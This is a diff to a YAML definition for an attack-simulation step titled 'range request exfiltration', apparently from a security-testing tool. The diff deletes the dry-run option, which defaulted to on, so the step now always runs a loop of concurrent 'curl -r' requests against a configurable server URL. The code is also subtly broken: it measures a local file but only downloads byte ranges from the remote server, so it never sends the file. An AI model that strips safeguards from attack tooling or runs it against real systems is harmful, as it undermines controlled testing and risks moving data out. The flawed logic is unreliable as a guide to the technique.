@@ -31,10 +31,6 @@ args:
   description: Number of concurrent requests
   type: string
   default: '4'
-- name: dry_run
-  description: Enable dry-run mode
-  type: string
-  default: 'true'
 steps:
 - name: Verify file exists
   inline: test -f '{{ .Args.data_file }}' || (echo "File not found"; exit 1)
@@ -60,16 +56,26 @@ steps:
     echo "  Content-Range: bytes 0-{{ .Args.range_size }}/[total]"
     echo "  Content-Length: {{ .Args.range_size }}"
 - name: Execute range request exfiltration
-  inline: "if [ '{{ .Args.dry_run }}' = 'true' ]; then\n  echo \"DRY RUN: HTTP Range Request Exfiltration\"\n  echo \"Strategy:\"\
-    \n  echo \"  1. Calculate file size and range boundaries\"\n  echo \"  2. Split exfiltration into {{ .Args.range_size\
-    \ }}-byte chunks\"\n  echo \"  3. Send concurrent HTTP range requests\"\n  echo \"  4. Reconstruct data from partial responses\"\
-    \n  echo \"\"\n  echo \"Sample commands:\"\n  for i in {0..2}; do\n    start=$((i * {{ .Args.range_size }}))\n    end=$((start\
-    \ + {{ .Args.range_size }} - 1))\n    echo \"  curl -r $start-$end '{{ .Args.server_url }}/data'\"\n  done\nelse\n  echo\
-    \ \"Initiating range request exfiltration...\"\n  filesize=$(stat -f%z '{{ .Args.data_file }}' 2>/dev/null || stat -c%s\
-    \ '{{ .Args.data_file }}')\n  \n  for ((i=0; i<filesize; i+={{ .Args.range_size }})); do\n    end=$((i + {{ .Args.range_size\
-    \ }} - 1))\n    if [ $end -gt $filesize ]; then\n      end=$((filesize - 1))\n    fi\n    \n    curl -r $i-$end '{{ .Args.server_url\
-    \ }}/data' &\n    \n    # Limit concurrent connections\n    active=$(jobs -r | wc -l)\n    while [ $active -ge {{ .Args.concurrent_requests\
-    \ }} ]; do\n      sleep 0.1\n      active=$(jobs -r | wc -l)\n    done\n  done\n  wait\nfi\n"
+  inline: |
+    echo "Initiating range request exfiltration..."
+    filesize=$(stat -f%z '{{ .Args.data_file }}' 2>/dev/null || stat -c%s '{{ .Args.data_file }}')
+
+    for ((i=0; i<filesize; i+={{ .Args.range_size }})); do
+      end=$((i + {{ .Args.range_size }} - 1))
+      if [ $end -gt $filesize ]; then
+        end=$((filesize - 1))
+      fi
+
+      curl -r $i-$end '{{ .Args.server_url }}/data' &
+
+      # Limit concurrent connections
+      active=$(jobs -r | wc -l)
+      while [ $active -ge {{ .Args.concurrent_requests }} ]; do
+        sleep 0.1
+        active=$(jobs -r | wc -l)
+      done
+    done
+    wait
   cleanup:
     inline: rm -f /tmp/test_ranges.dat
 tests:
